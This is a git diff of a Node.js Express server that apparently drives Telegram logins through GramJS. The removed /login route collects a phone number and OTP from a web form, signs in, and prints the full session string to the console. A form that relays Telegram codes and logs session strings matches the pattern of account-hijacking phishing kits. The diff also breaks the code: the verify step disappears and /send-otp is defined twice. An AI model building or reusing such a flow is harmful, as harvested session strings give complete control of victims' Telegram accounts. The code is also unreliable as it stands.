@@ -75,12 +75,10 @@ app.post('/send-otp', async (req, res) => {
 
 
 // 🔹 STEP 2: verify OTP
-app.post('/login', async (req, res) => {
-  let { phone, otp } = req.body;
+const { Api } = require('telegram');
 
-  if (!phone || !otp) {
-    return res.send("Phone & OTP required");
-  }
+app.post('/send-otp', async (req, res) => {
+  let { phone } = req.body;
 
   try {
     phone = String(phone).trim();
@@ -88,34 +86,36 @@ app.post('/login', async (req, res) => {
       phone = '+855' + phone;
     }
 
-    const temp = tempSessions[phone];
-
-    if (!temp) {
-      return res.send("Session expired. Try again.");
-    }
-
-    const { client, phoneCodeHash } = temp;
-
-    await client.signIn({
-      phoneNumber: phone,
-      phoneCode: String(otp),
-      phoneCodeHash: phoneCodeHash,
+    const stringSession = new StringSession('');
+    const client = new TelegramClient(stringSession, apiId, apiHash, {
+      connectionRetries: 5,
     });
 
-    const sessionString = client.session.save();
+    await client.connect();
 
-    console.log("LOGIN SUCCESS:", phone);
-    console.log("SESSION:", sessionString);
+    // ✅ CORRECT METHOD (all versions)
+    const result = await client.invoke(
+      new Api.auth.SendCode({
+        phoneNumber: phone,
+        apiId: apiId,
+        apiHash: apiHash,
+        settings: new Api.CodeSettings({})
+      })
+    );
 
-    // cleanup
-    delete tempSessions[phone];
+    // save temp
+    tempSessions[phone] = {
+      client,
+      phoneCodeHash: result.phoneCodeHash,
+    };
 
-    res.send("<h3>✅ Login successful</h3>");
+    console.log("OTP sent:", phone);
+
+    res.json({ success: true });
 
   } catch (err) {
-    console.error("LOGIN ERROR:", err.message);
-
-    res.send(`<h3>❌ ${err.message}</h3>`);
+    console.error("SEND OTP ERROR:", err);
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
